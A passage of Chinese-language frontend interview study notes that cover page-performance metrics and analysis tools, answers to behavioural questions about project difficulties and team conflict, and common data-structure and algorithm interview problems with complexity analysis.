页面的**主要内容**绘制到屏幕上的时间。这是一个更好的衡量用户感知加载体验的指标，但无法统一衡量，因为每个页面的主要内容都不太一致。<br>
主流的分析工具都已弃用 FMP 而使用 LCP

### DomContentLoaded（DCL）
即 `DOMContentLoaded` 触发时间，DOM 全部解析并渲染完。

### Largest Contentful Paint（LCP） 
**可视区域中最大的内容元素**呈现到屏幕上的时间，用以估算页面的主要内容对用户可见时间。

### Load（L）
即 `window.onload` 触发时间，页面内容（包括图片）全部加载完成。

## 性能分析工具 - Chrome devtools

PS：建议在 Chrome 隐身模式测试，避免其他缓存的干扰。

Performance 可以检测到上述的性能指标，并且有网页快照截图。

![](./img/performance.png)


NetWork 可以看到各个资源的加载时间

![](./img/network.png)


## 性能分析工具 - Lighthouse

[Lighthouse](https://www.npmjs.com/package/lighthouse) 是非常优秀的第三方性能评测工具，支持移动端和 PC 端。
它支持 Chrome 插件和 npm 安装，国内情况推荐使用后者。

```sh
# 安装
npm i lighthouse -g

# 检测一个网页，检测完毕之后会打开一个报告网页
lighthouse https://imooc.com/ --view --preset=desktop # 或者 mobile
```

测试完成之后，lighthouse 给出测试报告

![](./img/lighthouse-performance.png)

并且会给出一些优化建议

![](./img/lighthouse-sug.png)

## 识别问题

网页慢，到底是加载慢，还是渲染慢？—— 分清楚很重要，因为前后端不同负责。

如下图是 github 的性能分析，很明显这是加载慢，渲染很快。

![](./img/github-performance.png)

## 解决方案

加载慢
- 优化服务端接口
- 使用 CDN
- 压缩文件
- 拆包，异步加载

渲染慢（可参考“首屏优化”）
- 根据业务功能，继续打点监控
- 如果是 SPA 异步加载资源，需要特别关注网络请求的时间

## 持续跟进

分析、解决、测试，都是在你本地进行，网站其他用户的情况你看不到。
所以要增加性能统计，看全局，不只看自己。

JS 中有 Performance API 可供获取网页的各项性能数据，对于性能统计非常重要。
如 `performance.timing` 可以获取网页加载各个阶段的时间戳。

如果你的公司没有内部的统计服务（一般只有大厂有），没必要自研，成本太高了。可以使用第三方的统计服务，例如阿里云 ARMS 。

## 答案

- 通过工具分析性能参数
- 识别问题：加载慢？渲染慢？
- 解决问题
- 增加性能统计，持续跟进、优化


# 实际工作经验\11-项目难点.md
# 项目难点

## 题目

你工作经历中，印象比较深的项目难点，以及学到了什么？

## 日常积累的习惯

大家在日常工作和学习中，如果遇到令人头秃的问题，解决完之后一定要记录下来，这是你宝贵的财富。<br>
如果你说自己没遇到过，那只能说明：你没有任何工作经验，甚至没有认真学习过。

下面给出几个示例，我做 wangEditor 富文本编辑器时的一些问题和积累
- 编辑器 embed 设计 https://juejin.cn/post/6939724738818211870
- 编辑器扩展 module 设计 https://juejin.cn/post/6968061014046670884#heading-18
- 编辑器拼音输入问题和 toHtml 的问题 https://juejin.cn/post/6987305803073978404#heading-33

## 如果之前没积累

如果此前没有积累，又要开始面试了，请抓紧回顾一下近半年让你困惑的一个问题。做程序员总会有那么几个问题折腾好久才能解决，不难找的。

就抓住这一个问题（不要太多），认真复盘，详细写出一篇博客文章
- 光想、光看没用，写出来才能印象深刻
- 文章要有内容有深度，要耐心写，不要求快（找个周末，闷在家里，一天时间写出来）
- 文章不求别人看，只求自己积累

## 复盘和成长

要通过问题，最终体现出自己的解决方案、复盘和成长。而不是只抛出问题

## 答案

找到一个问题，按照下面的套路回答
- 描述问题：背景，现象，造成的影响
- 问题如何被解决：分析、解决
- 自己的成长：从中学到了什么，以后会怎么避免

PS：这不是知识点，没法统一传授，我的经验你拿不走，只能靠你自己总结。

## 示例

PS：工作中有保密协议，所以只能说一些开源的，但也决定具有参考价值。

以编辑器 [toHtml](https://www.wangeditor.com/v5/guide/display.html) 的问题作为一个示例，找个功能比较好理解。

问题描述
- 新版编辑器只能输入 JSON 格式内容，无非输入 html
- 旧版编辑器却只能输入 html 格式
- 影响：旧版编辑器无法直接升级到新版编辑器

问题如何解决
- 文档写清楚，争取大家的理解
- 给出一些其他的升级[建议](https://github.com/wangeditor-team/wangEditor-v5/issues/233)
- 后续会增加 `editor.dangerouslyInsertHTML` API 尽量兼容 html 格式

自己的成长
- 要考虑一个产品完整的输入输出，而不只考虑编辑功能
- 要考虑旧版用户的升级成本
- 要参考其他竞品的设计，尽量符合用户习惯


# 实际工作经验\12-文本小节-处理项目沟通冲突.md
# 处理沟通冲突

注：文本小节

## 题目

项目中有没有发生过沟通的冲突（和其他角色）？如何解决的

## 分析

有项目有合作，有合作就有沟通，有沟通就有冲突，这很正常。哪怕你自己单独做一个项目，你也需要和你的老板、客户沟通。

面试官通过考察这个问题，就可以从侧面得知你是否有实际工作经验。
因为即便你是一个项目的“小兵”，不是负责人，你也会参与到一些沟通和冲突中，也能说出一些所见所闻。

当然，如果你之前是项目负责人，有过很多沟通和解决冲突的经验，并在面试中充分表现出来。
相信面试官会惊喜万分（前提是技术过关），因为“技术 + 项目管理”这种复合型人才非常难得。

## 常见的冲突

- 需求变更：PM 或者老板提出了新的需求
- 时间延期：上游或者自己延期了
- 技术方案冲突：如感觉服务端给的接口格式不合理

## 正视冲突

从个人心理上，不要看到冲突就心烦，要拥抱变化，正视冲突。冲突是项目的一部分，就像 bug 一样，心烦没用。

例如，PM 过来说要修改需求，你应该回答：**“可以呀，你组织个会议讨论一下吧，拉上各位领导，因为有可能会影响工期。”**

再例如，自己开发过程中发现可能会有延期，要及早的汇报给领导：**“我的工期有风险，因为 xxx 原因，不过我会尽量保证按期完成。”**<br>
千万不要不好意思，等延期了被领导发现了，这就不好了。

## 解决冲突

合作引起的冲突，最终还是要通过沟通来解决。

一些不影响需求和工期的冲突，如技术方案问题，尽量私下沟通解决。实在解决不了再来领导开会。<br>
需求变更和时间延期一定要开会解决，会议要有各个角色决定权的领导去参与。

注意，无论是私下沟通还是开会，涉及到自己工作内容变动的，一定要有结论。
最常见的就是发邮件，一定要抄送给各位相关的负责人。这些事情要公开，有记录，不要自己偷偷的就改了。

## 如何规避冲突

- 预估工期留有余地
- 定期汇报个人工作进度，提前识别风险

## 答案

- 经常遇到哪些冲突
- 解决冲突
- 自己如何规避冲突

PS：最好再能准备一个案例或者故事，效果会非常好，因为人都喜欢听故事。


# 实际工作经验\13-总结.md
# 总结

## 内容总结

本章讲解实际工作经验的面试题。无论是校招还是社招，企业都希望得到工作经验丰富的候选人。
体现工作经验的有：性能分析和优化、设计模式应用、错误监听等。

## 划重点

- 性能优化的实践
- 设计模式的应用
- 错误监控的实践

## 注意事项

- 应届毕业生也需要工作经验 —— 你的毕业设计，实习经历


# 数据结构和算法\00-开始.md
# 数据结构和算法

数据结构和算法，是大厂前端面试的“拦路虎”，很多同学都望而生畏。其实如果了解常用数据结构，掌握基本的算法思维，就不能应对。本章将通过多个面试题，为你讲解算法面试题的解题思路，同时复习常用数据结构和算法思维。

## 为何要考察

如果在短时间之内快速判断一个工程师是否优秀？考察算法是最合理的方式 —— 这是业界多年的经验积累。

前端面试考算法不是因为内卷。算法一直在后端面试中被考察，现在前端也考查，说明前端能做的工作越来越多了。这是好事。

## 考察的重点

- 算法的时间复杂度和空间复杂度
- 三大算法思维：贪心，二分，动态规划
- 常见数据结构

## 注意事项

- 算法，有难度，轻耐心学习
- 不仅关注题目本身，更要关注知识点和解题思路
- 按顺序学习（本章课程按顺序设计的）

## 看几个面试题

列举几个代表性的面试题，具体参考视频。


# 数据结构和算法\01-旋转数组.md
# 旋转数组

## 题目

定义一个函数，实现数组的旋转。如输入 `[1, 2, 3, 4, 5, 6, 7]` 和 `key = 3`， 输出 `[5, 6, 7, 1, 2, 3, 4]`<br>
考虑时间复杂度和性能

## 实现思路

思路1
- 将 `k` 后面的元素，挨个 `pop` 然后 `unshift` 到数组前面

思路2
- 将 `k` 后面的所有元素拿出来作为 `part1`
- 将 `k` 前面的所有元素拿出来作为 `part2`
- 返回 `part1.concat(part2)`

## 写代码

- 源码和性能测试 `array-rotate.js`
- 单元测试 `array-rotate.test.js`

经过性能测试，知道“思路2”性能更优。看来，思路简单并不一定性能最优。

【注意】我看到网上有很多人为“思路1”的写法点赞，要保持独立思考，不要从众！

## 时间复杂度

复杂度用 `O` 表示，说的是**数量级**，而不是具体的数字，如
- `O(2)` `O(3)` `O(100)` 其实都是 `O(1)`
- `O(n)` `O(2 * n)` 其实都是 `O(n)`

常见的时间复杂度
- `O(1)` 无循环
- `O(n)` 单次循环
- `O(logn)` 二分法
- `O(n*logn)` 单次循环 & 二分法
- `O(n^2)` 嵌套循环

![](./img/时间复杂度.png)

【注意】如果你用到了 API （如数组 `unshift`）要结合数据结构去分析复杂度。**要看到代码的本质**。

## 空间复杂度

算法需要额外定义多少变量？

- `O(1)` 定义了为数不多的变量，和 `n` 无关
- `O(n)` 需要定义和 `n` 级别的变量，如额外复制一个同样的数组
- 其他不常见

前端算法通常不太考虑空间复杂度，或者它比时间复杂度要次要的多。<br>
因为前端环境，通常内存都是足够的，或者内存不够通常也是其他因素（如媒体文件）。

## 性能对比

时间复杂度
- 思路1 - 看代码时间复杂度是 `O(n)`，**但数组是有序结构 `unshift` 本身就是 `O(n)` 复杂度**，所以实际复杂度是 `O(n^2)`
- 思路2 - `O(1)`。`slice` 和 `concat` 不会修改原数组，而数组是有序结构，复杂度是 `O(1)` 。

空间复杂度
- 思路1 - `O(1)`
- 思路2 - `O(n)`

## 答案

整体分析，选择“思路2”

## 划重点

- 考虑参数非法情况，代码鲁棒性
- 算法复杂度
    - 要看到全部的时间复杂度（包括 API）
    - 重时间，轻空间
- 数组是有序结构，`shift` `unshift` 等要慎用
- 单元测试

## 扩展 - 不要过度优化

其实还有一种思路，时间复杂度 `O(n)` ，空间复杂度 `O(1)` ，思路：
- k 前面的元素移动到 `i + (length - k)` 的位置
- k 后面的元素移动到 `i - k` 的位置

但不推荐这样的做法
- 前端重时间、轻空间，优先考虑时间复杂度，而非空间复杂度
- 代码是否易读，是否易沟通 —— 这个比性能更重要！人力成本永远是最贵的！！


# 数据结构和算法\02-括号匹配.md
# 括号匹配

## 题目

一个字符串内部可能包含 `{ }` `( )` `[ ]` 三种括号，判断该字符串是否是括号匹配的。<br>
如 `(a{b}c)` 就是匹配的， `{a(b` 和 `{a(b}c)` 就是不匹配的。

## 栈 Stack

该题目的考察目的很明确 —— 栈

栈，先进后出，基本的 API
- push
- pop
- length

和栈相关的数据结构（后面讲）
- 队列，先进先出
- 堆，如常说的“堆栈模型”

## 逻辑结构和物理结构

栈和数组有什么区别？—— 没有可比性，两者不一个级别。就像：房子和石头有什么区别？

栈是一种逻辑结构，一种理论模型，它可以脱离编程语言单独讲。<br>
数组是一种物理结构，代码的实现，不同的语言，数组语法是不一样的。

栈可以用数组来表达，也可以用链表来表达，也可以自定义 `class MyStack {...}` 自己实现…<br>
在 JS 中，栈一般情况下用数组实现。

## 思路

- 遇到左括号 `{ ( [` 则压栈
- 遇到右括号 `} ) ]` 则判断栈顶，相同的则出栈
- 最后判断栈 length 是否为 0

## 答案

参考 match-brackets.ts 和 match-brackets.test.ts

## 划重点

- 栈
- 逻辑结构和物理结构


# 数据结构和算法\03-用两个栈实现一个队列.md
# 用两个栈实现一个队列

## 题目

请用两个栈，来实现队列的功能，实现功能 `add` `delete` `length` 。

## 队列 Queue

栈，先进后出

队列，先进先出，API 包括
- add
- delete
- length

常见的“消息队列”就是队列的一种应用场景
- A 系统向 B 系统持续发送海量的消息
- A 系统先把一条一条消息放在一个 queue
- B 系统再从 queue 中逐条消费（按顺序，先进先出）

## 逻辑结构和物理结构

队列和栈一样，是一种逻辑结构。它可以用数组、链表等实现。<br>
思考：用数组实现队列，性能会怎样 —— add 怎样？delete 怎样？

复杂场景下（如海量数据，内存不够用）需要单独设计。

## 题目分析

可画图分析：参考视频讲解

- 队列 add
    - 往 stack1 push 元素
- 队列 delete
    - 将 stack1 所有元素 pop 出来，push 到 stack2
    - 将 stack2 执行一次 pop
    - 再将 stack2 所有元素 pop 出来，push 进 stack1

## 答案

参考 two-stacks-one-queue.ts

## 划重点

- 队列
- 画图，帮助梳理解题思路


# 数据结构和算法\04-反转链表.md
# 反转单向链表

## 题目

定义一个函数，输入一个单向链表的头节点，反转该链表，并输出反转之后的头节点

## 链表

链表是一种物理结构（非逻辑结构），是数组的补充。<br>
数组需要一段连续的内存空间，而链表不需要。

数据结构
- 单向链表 `{ value, next }`
- 双向链表 `{ value, prev, next }`

两者对比
- 链表：查询慢，新增和删除较快
- 数组：查询快，新增和删除较慢

## 应用场景

React Fiber 就把 vdom 树转换为一个链表，这样才有可能随时中断、再继续进行。<br>
如果 vdom 是树，那只能递归一次性执行完成，中间无法断开。

![](./img/react-fiber-链表.png)

## 分析

反转链表，画图很好理解。没有捷径，遍历一边，重新设置 next 指向即可。<br>
但实际写代码，却并不简单，很容易造成 nextNode 丢失。

因此，遍历过程中，至少要存储 3 个指针 `prevNode` `curNode` `nextNode`

时间复杂度 `O(n)`

## 答案

参考 reverse-link-list.ts

## 划重点

- 链表
- 链表和数组的不同
    - 内存占用
    - 查询、新增、删除的效率
- 如何保证 nextNode 不丢失

## 扩展

思考：用数组和链表实现队列，哪个性能更好？


# 数据结构和算法\05-二分查找.md
# 二分查找

## 题目

用 Javascript 实现二分查找（针对有序数组），说明它的时间复杂度

## 一个故事

N 年前，百度，一个复杂的后台系统出现了问题，因为太大找不到问题所在。
一个工程师，使用二分法，很快找到了问题原因。

无论多么大的数据量，一旦有了二分，便可快速搞定。<br>
二分法，是算法的一个重要思维。

但二分法有一个条件：需要有序数据。

## 分析

二分查找是一种固定的算法，没什么可分析的。

两种实现思路
- 递归 - 代码逻辑更加简洁
- 循环 - 性能更好（就调用一次函数，而递归需要调用很多次函数，创建函数作用域会消耗时间）

时间复杂度 `O(logn)`

## 答案

参考 binary-search.ts 和 binary-search.test.ts

## 划重点

- 有序，就一定要想到二分
- 二分的时间复杂度必定包含 `O(logn)`


# 数据结构和算法\06-两数之和.md
# 两数之和

## 题目

输入一个递增的数字数组，和一个数字 `n` 。求和等于 `n` 的两个数字。<br>
例如输入 `[1, 2, 4, 7, 11, 15]` 和 `15` ，返回两个数 `[4, 11]`

## 分析

注意题目的要点
- 递增，从小打大排序
- 只需要两个数字，而不是多个

## 常规思路

嵌套循环，找个一个数，然后再遍历剩余的数，求和，判断。

时间复杂度 `O(n^2)` ，基本不可用。

## 利用递增的特性

数组是递增的
- 随便找两个数
- 如果和大于 n ，则需要向前寻找
- 如果和小于 n ，则需要向后寻找 —— **二分法**

双指针（指针就是索引，如数组的 index）
- i 指向头，j 指向尾， 求 i + j 的和
- 和如果大于 n ，则说明需要减少，则 j 向前移动（递增特性）
- 和如果小于 n ，则说明需要增加，则 i 向后移动（递增特性）

时间复杂度降低到 `O(n)`

## 答案

方案二，参考 two-numbers-sum.ts

## 划重点

- 有序数据，要善用二分法
- 优化嵌套循环，可以考虑“双指针”


# 数据结构和算法\07-BST第K小值.md
# 求二叉搜索树的第 K 小的值

## 题目

一个二叉搜索树，求其中的第 K 小的节点的值。
如下图，第 3 小的节点是 `4`

![](./img/二叉搜索树.png)

## 二叉树

树，大家应该都知道，如前端常见的 DOM 树、vdom 结构。

二叉树，顾名思义，就是每个节点最多能有两个子节点。

```ts
interface ITreeNode {
    value: number // 或其他类型
    left?: ITreeNode
    right?: ITreeNode
}
```

## 二叉树的遍历

- 前序遍历：root -> left -> right
- 中序遍历：left -> root -> right
- 后序遍历：left -> right -> root

## 二叉搜索树 BST

- 左节点（包括其后代） <= 根节点
- 右节点（包括其后代） >= 根节点 

思考：BST 存在的意义是什么？—— 后面解释

## 分析题目

根据 BST 的特点，中序遍历的结果，正好是按照从小到大排序的结果。<br>
所以，中序遍历，求数组的 `arr[k]` 即可。

## 答案

代码 binary-search-tree-k-value.ts

## 划重点

- 二叉搜索树的特点
- 前序、中序、后序遍历


# 数据结构和算法\08-为何二叉树重要.md
# 为何二叉树重要

## 题目

为何二叉树那么重要，而不是三叉树、四叉树呢？

## 分析

树是常见的数据结构，如 DOM 树，是一种多叉树。<br>
其中二叉树是一个特别的存在，很重要，很常考。

【注意】本文涉及很多数据结构的知识，所以要“不求甚解” —— 掌握要点和结果，不求细节和过程

## 如何让性能整体最优？

有序结构
- 数组：查找易，增删难
- 链表：增删易，查找难

将两者优点结合起来 —— 二叉搜索树 BST ：查找易，增删易 —— 可使用二分算法

二叉搜索树 BST
- 左节点（包括其后代） <= 根节点
- 右节点（包括其后代） >= 根节点 

![](./img/二叉搜索树.png)

## 高级二叉树

二叉搜索树 BST ，如果左右不平衡，也无法做到最优。<br>
极端情况下，它就成了链表 —— 这不是我们想要的。

平衡二叉搜索树 BBST ：要求树左右尽量平衡
- 树高度 `h` 约等于 `logn`
- 查找、增删，时间复杂度都等于 `O(logn)`

红黑树：一种自动平衡的二叉树
- 节点分 红/黑 两种颜色，通过颜色转换来维持树的平衡
- 相比于普通平衡二叉树，它维持平衡的效率更高

![](./img/红黑树.png)

B 树：物理上是多叉树，但逻辑上是一个 BST 。用于高效 I/O ，如关系型数据库就用 B 树来组织数据结构。

![](./img/B树.png)

## 堆

JS 执行时代码中的变量
- 值类型 - 存储到栈
- 引用类型 - 存储到堆

![](./img/堆栈内存.png)

堆的特点：
- 节点的值，总是不大于（或不小于）其父节点的值
- 完全二叉树

![](./img/完全二叉树.png)

堆，虽然逻辑上是二叉树，但实际上它使用数组来存储的。

![](./img/堆.webp)

```js
// 上图是一个堆（从小到大），可以用数组表示
const heap = [-1, 10, 14, 25, 33, 81, 82, 99] // 忽略 0 节点

// 节点关系
const parentIndex = Math.floor(i / 2)
const leftIndex = 2 * i
const rightIndex = 2 * i + 1
```

堆的排序规则，没有 BST 那么严格，这就造成了
- 查询比 BST 慢
- 增删比 BST 快，维持平衡也更快
- 但整体复杂度都是 `O(logn)` 级别，即树的高度

但结合堆的应用场景
- 一般使用内存地址（栈中保存了）来查询，不会直接从根节点搜索
- 堆的物理结构是数组，所以查询复杂度就是 `O(1)`

总结
- 物理结构是数组（空间更小），逻辑结构是二叉树（操作更快）
- 适用于“堆栈”结构

## 答案

- 二叉树，可以充分利用二分法
- 二叉树可以同时规避数字和链表的缺点
- 引申到 BST BBST 等其他扩展结构

## 划重点

- 二分法的神奇力量
- 各个高级数据结构的存在价值、设计初衷
- 数据结构是基本功能


# 数据结构和算法\09-斐波那契数列.md
# 斐波那契数列

## 题目

用 Javascript 计算第 n 个斐波那契数列的值，注意时间复杂度。

## 分析

斐波那契数列很好理解
- `f(0) = 0`
- `f(1) = 1`
- `f(n) = f(n - 1) + f(n - 2)` 前两个值的和

## 递归计算

但这种方式会导致很多重复计算。<br>
时间复杂度是 `O(2^n)` ，爆炸式增长，不可用。（可以试试 `n: 100` ，程序会卡死）

![](./img/斐波那契数列.png)

## 优化

不用递归，用循环，记录中间结果。时间复杂度降低到 `O(n)`

## 动态规划

即，把一个大问题，拆解为不同的小问题，递归向下。

【注意】一般使用动态规划的思路（递归）分析问题，再转换为循环来解决问题。

## 三大算法思维

- 贪心（递归）
- 二分
- 动态规划

## 答案

使用循环的方式，参考 fibonacci.ts

## 划重点

- 动态规划的思路
- 识别出时间复杂度

## 扩展

青蛙跳台阶：一只青蛙，一次可以跳 1 个台阶，也可以跳 2 个台阶，问该青蛙跳上 n 级台阶，总共有多少种方式？

分析
- `f(1) = 1` 跳 1 级台阶，只有一种方式
- `f(2) = 2` 跳 2 级台阶，有两种方式
- `f(n) = f(n - 1) + fn(n - 2)` 跳 n 级，可拆分为两个问题
    - 第一次跳，要么 1 级，要么 2 级，只有这两种
    - 第一次跳 1 级，剩下有 `f(n - 1)` 种方式
    - 第一次跳 2 级，剩下有 `f(n - 2)` 种方式

看公式，和斐波那契数列一样。


# 数据结构和算法\10-移动0.md
# 移动 0

## 题目

定义一个函数，将数组种所有的 `0` 都移动到末尾，例如输入 `[1, 0, 3, 0, 11, 0]` 输出 `[1, 3, 11, 0, 0, 0]`。要求：
- 只移动 `0` ，其他数字顺序不变
- 考虑时间复杂度
- 必须在原数组就行操作

## 如果不限制“必须在原数组修改”

- 定义 `part1` `part2` 两个空数组
- 遍历数组，非 `0` push 到 `part1` ，`0` push 到 `part2`
- 返回 `part1.concat(part2)`

时间复杂度 `O(n)` 空间复杂度 `O(n)` ，

所以，遇到类似问题，要提前问面试官：**是否能在原数组基础上修改？**

## 传统方式

思路
- 遍历数组
- 遇到 `0` 则 push 到数组末尾
- 然后用 splice 截取掉当前元素

分析性能
- 空间复杂度没有问题 `O(1)`
- 时间复杂度
    - 看似是 `O(n)`
    - 但实际上 `splice` 和 `unshift` 一样，修改数组结构，时间复杂度是 `O(n)`
    - 总体看来时间复杂度是 `O(n^2)`，不可用

【注意】网上有很多人对这种方式点赞，切不可随意从众，要对思考！

## 双指针

思路（可画图解释，参考视频讲解）
- 指针1 指向第一个 0 ，指针2 指向第一个非 0
- 把指针1 和 指针2 进行交换
- 指针向后移

性能分析
- 时间复杂度 `O(n)`
- 空间复杂度 `O(1)`

性能测试，实际对比差距非常大。

## 答案

使用双指针，保证时间复杂度。参考 move-zero.ts

## 划重点

- 咨询面试官，确认是否必须要修改原数据？
- 数组是有序结构，不能随意 `splice` `unshift`
- 双指针的思路


# 数据结构和算法\11-连续最多的字符.md
# 连续最多的字符

## 题目

给一个字符串，找出连续最多的字符，以及次数。<br>
例如字符串 `'aabbcccddeeee11223'` 连续最多的是 `e` ，4 次。

## 传统方式

嵌套循环，找出每个字符的连续次数，并记录比较。

时间复杂度看似是 `O(n^2)`，因为是嵌套循环。 **但实际上它的时间复杂度是 `O(n)`，因为循环中有跳转**。

## 双指针

画图解释，参考视频讲解。

只有一次循环，时间复杂度是 `O(n)`

性能测试，发现两者时间消耗一样，**循环次数也一样**。

## 其他方式

这个题目网上还有其他的答案
- 正则表达式 —— 正则表达式的效率非常低，可进行性能测试（代码 `x-reg.ts` ）
- 使用数组累计各个字符串的长度，然后求出最大值 —— 增加空间复杂度，面试官不会喜欢

【注意】算法尽量用基础代码实现，尽量不要用现成的 API 或语法糖 —— 方便，但你不好直观判断时间复杂度

## 答案

上述两种方式（嵌套循环和双指针）都可以，参考 continuous-char.ts

## 划重点

- 注意实际的时间复杂度，不要被代码所迷惑
- 双指针的思路（常用于解决嵌套循环）


# 数据结构和算法\12-快速排序.md
# 快速排序

## 题目

用 Javascript 实现快速排序，并说明时间复杂度。

## 思路

快速排序是基础算法之一，算法思路是固定的
- 找到中间位置 midValue
- 遍历数组，小于 midValue 放在 left ，大于 midValue 放在 right
- 继续递归，concat 拼接

## splice 和 slice

代码实现时，获取 midValue 可以通过 `splice` 和 `slice` 两种方式

理论分析，`slice` 要优于 `splice` ，因为 `splice` 会修改原数组。<br>
但实际性能测试发现两者接近。

但是，即便如此还是倾向于选择 `slice` —— **因为它不会改动原数组**，类似于函数式编程

## 性能分析

快速排序 时间复杂度 `O(n*logn)` —— 有遍历，有二分

普通的排序算法（如冒泡排序）时间复杂度时 `O(n^2)`

## 答案

使用 slice 方案，参考 quick-sort.ts

## 划重点

- 排序算法（基本功）
- 二分法的时间复杂度
- 注意数组的操作（ `splice` vs `slice` ）


# 数据结构和算法\13-回文数字.md
# 1-10000 之间的对称数（回文）

## 题目

打印 1-10000 之间的对称数

## 使用数组反转

- 数字转换为字符串
- 字符串转换为数组 reverse ，再 join 生成字符串
- 比较前后的字符串

## 使用字符串头尾比较

- 数字转换为字符串
- 字符串头尾比较

还可以使用**栈**（但栈会用到数组，性能不如直接操作字符串）
- 数字转换为字符串，求长度
- 如果长度是偶数，则用栈比较
- 如果长度是奇数，则忽略中间的数字，其他的用栈比较

## 生成反转数

- 通过 `%` 和 `Math.floor` 将数字生成一个反转数
- 比较前后的数字

## 性能分析

时间复杂度看似相当，都是 `O(n)`

但 方案1 涉及到了数组的转换和操作，就需要耗费大量的时间
- 数组 reverse 需要时间
- 数组和字符串的转换需要时间

方案 2 3 比较，数字操作最快。电脑的原型就是计算器，所以处理数字是最快的。

## 答案

第三种方案，参考 palindrome-number.ts

## 划重点

- 尽量不要使用内置 API ，不好判断时间复杂度
- 尽量不要转换数据格式，尤其注意数组（有序结构，不能乱来～）
- 数字操作最快


# 数据结构和算法\14-字符串前缀匹配.md
# 搜索单词

字符串前缀匹配

## 题目

请描述算法思路，不要求写出代码。
- 先给一个英文单词库（数组），里面有几十万个英文单词
- 再给一个输入框，输入字母，搜索单词
- 输入英文字母，要实时给出搜索结果，按前缀匹配

要求
- 尽量快
- 不要使用防抖（输入过程中就及时识别）

## 常规思路

`keyup` 之后，拿当前的单词，遍历词库数组，通过 `indexOf` 来前缀匹配。

性能分析
- 算法思路的时间复杂度是 `O(n)`
- 外加 `indexOf` 也需要时间复杂度。实际的复杂度要超过 `O(n)`

## 优化数据结构

英文字母一共 26 个，可按照第一个字母分组，分为 26 组。这样搜索次数就减少很多。

可按照第一个字母分组，那也可以按照第二个、第三个字母分组。<br>
即，在程序初始化时，把数组变成一个树，然后按照字母顺序在树中查找。

```js
const arr = [
    'abs',
    'arab',
    'array',
    'arrow',
    'boot',
    'boss',
    // 更多...
]

const obj = {
    a: {
        b: {
            s: {}
        },
        r: {
            a: {
                b: {}
            },
            r: {
                a: {
                    y: {}
                },
                o: {
                    w: {}
                }
            }
        }
    },
    b: {
        o: {
            o: {
                t: {}
            },
            s: {
                s: {}
            }
        }
    },
    // 更多...
}
```

这样时间复杂度就大幅度减少，从 `O(n)` 降低到 `O(m)` （`m` 是单词的最大长度）

## 划重点

- 对于已经明确的范围的数据，可以考虑使用哈希表
- 以空间换时间


# 数据结构和算法\15-数字千分位.md
# 数字千分位

## 题目

将数字按照千分位生成字符串，即每三位加一个逗号。不考虑小数。<br>
如输入数字 `78100200300` 返回字符串 `'78,100,200,300'`

## 分析

- 使用数组
- 使用正则表达式
- 使用字符串拆分

## 性能分析

- 数组转换，影响性能
- 正则表达式，性能较差
- 操作字符串，性能较好

## 答案

方案二，参考 thousands-format.ts

## 划重点

- 从尾向头计算，和日常遍历的顺序相反
- 慎用数组操作
- 慎用正则表达式


# 数据结构和算法\16-切换字母大小写.md
# 切换字母大小写

## 题目

切换字母大小写，输入 `'aBc'` 输出 `'AbC'`

## 分析

需要判断字母是大写还是小写
- 正则表达式
- `charCodeAt` 获取 ASCII 码（ASCII 码表，可以网上搜索）

性能分析
- 正则表达式性能较差
- ASCII 码性能较好

## 答案

使用 `charCodeAt` ，参考代码 switch-case.ts

## 划重点

- 慎用正则表达式
- ASCII 码


# 数据结构和算法\17-小数相加.md
# 小数相加

## 题目

为何 `0.1 + 0.2 !== 0.3`

## 答案

计算机用二进制存储数据。

整数用二进制没有误差，如 `9` 表示为 `1001` 。<br>
而有的小数无法用二进制表示，如 `0.2` 用二进制表示就是 `1.10011001100...`

所以，累加小数时会出现误差。<br>
这不仅仅是 JS ，所有的计算机语言都这样。

## 扩展

可以使用第三方库 https://www.npmjs.com/package/mathjs


# 数据结构和算法\18-总结.md
# 总结

## 内容总结

本章讲解前端数据结构和算法的面试题。
包含了数组、栈、队列、链表、二叉树这些常见的数据结构。
常用的算法思维如贪婪、二分、动态规划，以及如何计算时间复杂度。

## 划重点

- 有序数据考虑用二分
- 双指针可以解决嵌套循环

## 注意事项

- 注意区分逻辑结构和物理结构，否则思维会很混乱
- 要有“算法敏感度”，条件反射般的根据数据结构分析时间复杂度


# 数据结构和算法\x1-文本小节-常见数据结构.md
# 常见数据结构

前端开发中常见的数据结构

## 栈 Stack

栈 Stack 是一种“先进后出”的数据结构。

![](./img/栈.png)

```js
// 数组实现 栈
const stack = []
stack.push(100) // 压栈
stack.pop() // 出栈
```

## 队列 Queue

队列 Queue 是一种“先进先出”的数据结构。

![](./img/队列.png)

```js
// 数组实现 队列
const queue = []
queue.push(100) // 入队
queue.shift() // 出队
```

## 链表 Linked list

链表不是连续的数据结构，而是由一系列的节点组成，节点之间通过指针连接。

![](./img/链表.png)

```ts
// 链表节点的数据结构
interface IListNode {
    data: any
    next: IListNode | null
}
```

## 树 Tree

树，是一种有序的层级结构。每个节点下面可以有若干个子节点。例如常见的 DOM 树。

![](./img/dom-tree.png)

```ts
// 树节点的数据结构
interface ITreeNode {
    data: any
    children: ITreeNode[] | null
}
```

## 二叉树 Binary Tree

二叉树，首先它是一棵树，其次它的每个节点，最多有两个子节点，分别为 `left` 和 `right`

![](./img/二叉搜索树.png)

```ts
// 二叉树节点的数据结构
interface IBinaryTreeNode {
    data: any
    left: IBinaryTreeNode | null
    right: IBinaryTreeNode | null
}
```


# 数据结构和算法\x2-文本小节-常见算法时间复杂度.md
# 算法时间复杂度

本文总结一下前端算法常用的时间复杂度，对比学习。

![](./img/时间复杂度.png)

## O(1)

代码就是平铺直叙的执行，没有任何循环。

## O(logn)

有循环，但其中使用了二分法，例如：二分查找算法

二分法是非常重要的算法思维，它可以极大的减少复杂度，而且计算量越大、减少的越明显。可以看看本文上面的图。

## O(n)

普通的循环。

## O(n*logn)

嵌套循环，一层是普通循环，一层有二分算法。例如：快速排序算法。

## O(n^2)

两个普通循环的嵌套，例如常见的冒泡排序。


# 知识广度\00-开始.md
# 开始

前端工程师有很多，而是技能全面、独当一面的前端工程师到哪里都是“香饽饽”，企业争抢。所以，技术广度将决定你的稀缺性，以及未来的发展空间。本章将通过多个面试题，讲解前端面试常考的技术广度问题，涉及前端、移动端、服务端等全流程。

## 为何要考察

现代前端工程师已经不单单是开发页面了，你可能需要去开发移动端、服务端。或者和他们有亲密的合作，你需要了解他们的运作流程。

企业想要招聘到一些全能型的工程师，能在工作中串通上下流程，而不是只做开发。

## 考察重点

- 移动端相关支持
- HTTP 网路相关支持
- nodejs 相关支持

## 注意事项

不会从 0 基础讲起，基础不熟悉的可以给我提问

## 看几个问题

列几个代表性的问题


# 知识广度\01-移动端click-300ms-延迟.md
# 移动端 click 300ms 延迟

## 题目

